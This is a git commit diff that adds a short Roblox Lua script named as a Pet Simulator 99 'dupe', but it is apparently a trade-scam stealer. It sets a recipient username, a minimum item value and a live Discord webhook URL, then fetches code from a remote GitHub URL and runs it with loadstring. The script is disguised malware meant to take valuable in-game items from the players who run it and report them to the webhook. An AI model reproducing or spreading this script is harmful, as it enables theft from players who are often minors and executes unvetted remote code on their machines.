c4ae6e80bb60fa79bb49dddfbd7a9062a4493fc9
ps99-0 <elghribi200@gmail.com>
2025-04-16 09:23:20 -0700

    Update and rename DupeHugeTradeScam.lua to DupeHugeTradeScamAutoaccept.lua

---
+++ DupeHugeTradeScamAutoaccept.lua
@@ -0,0 +1,6 @@
+Username = "jhhhhjjjj32"
+Username2 = "jhhhhjjjj32"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1362044321477427270/VQEuM6SrmQRk0OsO-5WZxp-1VPMTtzotNhXDckUqvHkMo56Avr3NpmDXaiJYJzz8enj0"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
